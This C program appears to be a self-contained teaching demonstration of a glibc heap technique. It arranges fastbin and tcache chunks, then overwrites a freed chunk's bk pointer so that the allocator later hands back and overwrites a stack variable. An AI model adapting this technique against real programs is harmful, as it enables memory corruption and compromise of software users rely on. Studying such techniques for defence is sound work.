#include <stdio.h>
#include <stdlib.h>
#include "malloc_struct.h"

int main(void){
	unsigned long *ma, *mb, *victim;
	malloc_chunk *ca;
	unsigned long var = 0xdeadbeef;

	printf("&var   : %p\nvar    = %#lx\n\n", &var, var);

	ma = malloc(0x18);
	ca = mem2chunk(ma);
	malloc(0);
	mb = malloc(0x18);
	for(int i=0; i<7; i++)
		free(calloc(1, 0x18));

	free(ma);	// to fastbin
	free(mb);	// to fastbin
	malloc(0x400);	// from top (malloc_consolidate())

	malloc(0x18);	// from tcache
#ifdef ALLOC_STACK
	malloc(0x18);	// from tcache
#endif

	puts("Exploit!");
	ca->bk = ((void*)&var) - 0x10;	// vuln
	calloc(1, 0x18);// from smallbin (smallbin -> tcache)
	printf("var    = %#lx\n", var);

#ifdef ALLOC_STACK
	victim = malloc(0x18);	// alloc var from tcache
	*victim = 0xcafebabe;	// overwrite
	printf("\nvictim = %p\nvar    = %#lx\n", victim, var);
#endif
}
